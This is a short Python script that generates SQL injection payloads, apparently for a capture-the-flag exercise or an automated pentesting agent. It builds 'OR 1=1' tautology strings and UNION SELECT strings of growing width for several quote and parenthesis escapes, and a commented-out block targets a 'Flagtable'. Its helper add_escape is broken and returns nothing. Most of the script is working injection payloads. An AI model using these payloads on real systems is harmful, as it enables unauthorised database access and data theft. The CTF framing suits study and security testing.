
def add_escape(instr, escape):
    if(escape == "'" or escape == '"'):
        escape + instr + escape


def generate_actions(escapes = None, max_columns = 5):
    actions = []
    if(escapes is None):
        # escapes = ["'", "')", '"', '")']
        escapes = ["'", "')", '"', '")', "", ")"]


    for esc in escapes:
        #Detect vulnerability
        x = ("0" if esc == "" or esc == ")" else "") + "{} OR 1=1; -- ".format(esc)
        actions.append(x)

        #To detect the number of columns and the required offset
        #Columns
        columns = "1"
        for i in range(2,max_columns+2):
            x = ("0" if esc == "" or esc == ")" else "") + "{0} UNION SELECT {1}; -- ".format(esc, columns)
            actions.append(x)

            columns = columns + "," + str(i)

        #To obtain the flag
        # columns = "flag"
        # for i in range(2, max_columns+2):
        #     x = "{0} UNION SELECT {1} from Flagtable limit 1 offset 1; -- ".format(esc, columns)
        #     actions.append(x)


        #     columns = columns + ",flag"



    return actions



if __name__ == "__main__":
    print("start")
    actions = generate_actions()

    print("Possible list of actions", len(actions))
    for action in actions:
        print(action)
